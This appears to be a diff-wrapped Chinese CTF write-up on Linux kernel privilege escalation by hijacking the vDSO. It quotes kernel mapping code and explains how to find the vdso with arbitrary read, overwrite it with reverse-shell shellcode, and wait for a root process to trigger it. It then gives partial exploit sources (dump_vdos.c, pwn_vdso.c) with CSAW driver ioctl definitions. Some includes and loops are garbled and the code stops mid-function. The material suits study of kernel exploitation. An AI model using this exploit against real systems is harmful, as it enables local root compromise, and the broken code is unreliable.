@@ -1,0 +1,168 @@
+            ret = addr;
+            goto up_fail;
+        }
+        text_start = addr - image->sym_vvar_start;
+        current->mm->context.vdso = (void __user *)text_start;
+        /*
+         * MAYWRITE to allow gdb to COW and set breakpoints
+         */
+        vma = _install_special_mapping(mm,
+                           text_start,
+                           image->size,
+                           VM_READ|VM_EXEC|
+                           VM_MAYREAD|VM_MAYWRITE|VM_MAYEXEC,
+                           &image->text_mapping);
+        if (IS_ERR(vma)) {
+            ret = PTR_ERR(vma);
+            goto up_fail;
+        }
+        vma = _install_special_mapping(mm,
+                           addr,
+                           -image->sym_vvar_start,
+                           VM_READ|VM_MAYREAD,
+                           &vvar_mapping);
+        if (IS_ERR(vma)) {
+            ret = PTR_ERR(vma);
+            goto up_fail;
+        }
+        if (image->sym_vvar_page)
+            ret = remap_pfn_range(vma,
+                          text_start + image->sym_vvar_page,
+                          __pa_symbol(&__vvar_page) >> PAGE_SHIFT,
+                          PAGE_SIZE,
+                          PAGE_READONLY);
+        if (ret)
+            goto up_fail;
+    #ifdef CONFIG_HPET_TIMER
+        if (hpet_address && image->sym_hpet_page) {
+            ret = io_remap_pfn_range(vma,
+                text_start + image->sym_hpet_page,
+                hpet_address >> PAGE_SHIFT,
+                PAGE_SIZE,
+                pgprot_noncached(PAGE_READONLY));
+            if (ret)
+                goto up_fail;
+        }
+    #endif
+        pvti = pvclock_pvti_cpu0_va();
+        if (pvti && image->sym_pvclock_page) {
+            ret = remap_pfn_range(vma,
+                          text_start + image->sym_pvclock_page,
+                          __pa(pvti) >> PAGE_SHIFT,
+                          PAGE_SIZE,
+                          PAGE_READONLY);
+            if (ret)
+                goto up_fail;
+        }
+    up_fail:
+        if (ret)
+            current->mm->context.vdso = NULL;
+        up_write(&mm->mmap_sem);
+        return ret;
+    }
+当时，在看这里时想到一个问题，既然vdso可以在用户态采用mprotect的方法改为rwx，而且所有用户态用的是一块物理页，为什么在用户态修改vdso不会影响到其他程序呢？最终在如下[链接](http://p4nda.top/WooyunDrops/#!/drops/1059.%E7%AE%80%E5%8D%95%E7%B2%97%E6%9A%B4%E6%9C%89%E6%95%88%E7%9A%84mmap%E4%B8%8Eremap_pfn_range)中找到答案。
+## 漏洞利用
+当了解了上述知识，这种劫持方法就很容易理解了。
+首先，利用内存读找到内存中vdso的逻辑页，由于内核态有写入的权限，因此利用任意写写入shellcode覆盖其中某些函数。
+其次，等待某root进程或者有s权限的进程调用这个函数就可以利用反弹shell完成提权。  
+与上一中方法不同的是，这种方法并不直接提权，而是采用守株待兔的方法，等待其他高权限进程触发，而返回shell。
+如何爆破找到vdso呢？首先根据上文的内核内存图可以确定vdso的范围在0xffffffff80000000~0xffffffffffffefff，而且该映射满足页对齐，并且存在ELF文件结构，且所有内存值都可以知道，如用如下脚本可以dump出vdso，比较坑的是每个版本的vdso函数偏移都不一样：
+**dump_vdos.c**
+    #include 
+    #include 
+    #include 
+    #include 
+    #include  
+     #include 
+    int main(){
+        unsigned long sysinfo_ehdr = getauxval(AT_SYSINFO_EHDR);
+        if (sysinfo_ehdr!=0){
+            for (int i=0;i
+    int main(){
+        while(1){
+            puts("111");
+            sleep(1);
+            gettimeofday();
+        }
+    }
+**pwn_vdso.c**
+    #include 
+    #include        
+    #include 
+    #include 
+    #include 
+    #include 
+    #include  
+    #define CSAW_IOCTL_BASE     0x77617363
+    #define CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1
+    #define CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2
+    #define CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3
+    #define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4
+    #define CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5
+    #define CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6
+    #define CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7
+    #define CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8
+    struct alloc_channel_args {
+        size_t buf_size;
+        int id;
+    };
+    struct open_channel_args {
+        int id;
+    };
+    struct shrink_channel_args {
+        int id;
+        size_t size;
+    };
+    struct read_channel_args {
+        int id;
+        char *buf;
+        size_t count;
+    };
+    struct write_channel_args {
+        int id;
+        char *buf;
+        size_t count;
+    };
+    struct seek_channel_args {
+        int id;
+        loff_t index;
+        int whence;
+    };
+    struct close_channel_args {
+        int id;
+    };
+    void print_hex(char *buf,size_t len){
+        int i ;
+        for(i = 0;i<((len/8)*8);i+=8){
+            printf("0x%lx",*(size_t *)(buf+i) );
+            if (i%16)
+                printf(" ");
+            else
+                printf("\n");
+        }
+    }
+    void show_vdso_userspace(int len){
+        size_t addr=0;
+        addr = getauxval(AT_SYSINFO_EHDR);
+        if(addr<0){
+            puts("[-]cannot get vdso addr");
+            return ;
+        }
+        for(int i = len;i<0x1000;i++){
+            printf("%x ",*(char *)(addr+i));
+        }
+    }
+    int check_vsdo_shellcode(char *shellcode){
+        size_t addr=0;
+        addr = getauxval(AT_SYSINFO_EHDR);
+        printf("vdso:%lx\n", addr);
+        if(addr<0){
+            puts("[-]cannot get vdso addr");
+            return 0;
+        }   
+        if (memmem((char *)addr,0x1000,shellcode,strlen(shellcode) )){
+            return 1;
+        }
+        return 0;
+    }
+    int main(){
